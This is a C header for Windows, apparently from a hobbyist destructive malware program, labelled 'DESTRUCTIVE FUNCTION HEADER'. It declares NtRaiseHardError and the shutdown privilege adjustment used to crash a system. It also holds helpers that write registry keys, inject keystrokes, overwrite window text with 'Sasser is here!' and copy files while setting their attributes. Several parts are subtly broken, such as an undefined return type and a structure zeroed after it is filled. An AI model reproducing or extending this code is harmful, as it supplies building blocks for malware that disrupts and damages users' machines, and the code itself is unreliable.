#include <windows.h>
#define HKLM HKEY_LOCAL_MACHINE
#define HKCU HKEY_CURRENT_USER
#define HKCR HKEY_CLASSES_ROOT
#define clearmem(buffer, size) memset(buffer, 0, size)

// DESTRUCTIVE FUNCTION HEADER //

EXTERN_C NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, LPBYTE);
EXTERN_C NTSTATUS WINAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PULONG_PTR, DWORD, LPDWORD);
/* Don't kill me for this :[ */

FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
    HKEY hkResult;
    if (isSet == false) {
        if (isString == false) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
    else if (isSet == true) {
        if (isString == false) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
} // My registry adding code (I hate using system() or ShellExecute so I made this longline registry tree)

typedef DWORD LONGWORD; // So it fits (sort of)

VOID NTAPI AdjustShutdownPriv(void) {
	BYTE ntByte;
	RtlAdjustPrivilege(19, true, false, &ntByte);
}

VOID WINAPI InsKeyboardInput(WORD wVk, LONGWORD dwFlags, UINT Delay) {
	INPUT kinpt;
	kinpt.type = INPUT_KEYBOARD;
	
	kinpt.ki.wVk = wVk;
	kinpt.ki.dwFlags = dwFlags;
	clearmem(&kinpt, sizeof(kinpt));
	SendInput(1, &kinpt, sizeof(kinpt));
	Sleep(Delay);
}

int CALLBACK EnumChildProc(HWND hwnd, LONG_PTR lPtr) {
	SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)L"Sasser is here!");
	return true;
}

void SetCopiedFileAttributes(LPCWSTR filename1, LPCWSTR filename2, LONGWORD attributes, bool ifexists) {
	CopyFileW(filename1, filename2, ifexists); // Holy f*ck, Baldi reference!
	SetFileAttributesW(filename2, attributes);
}
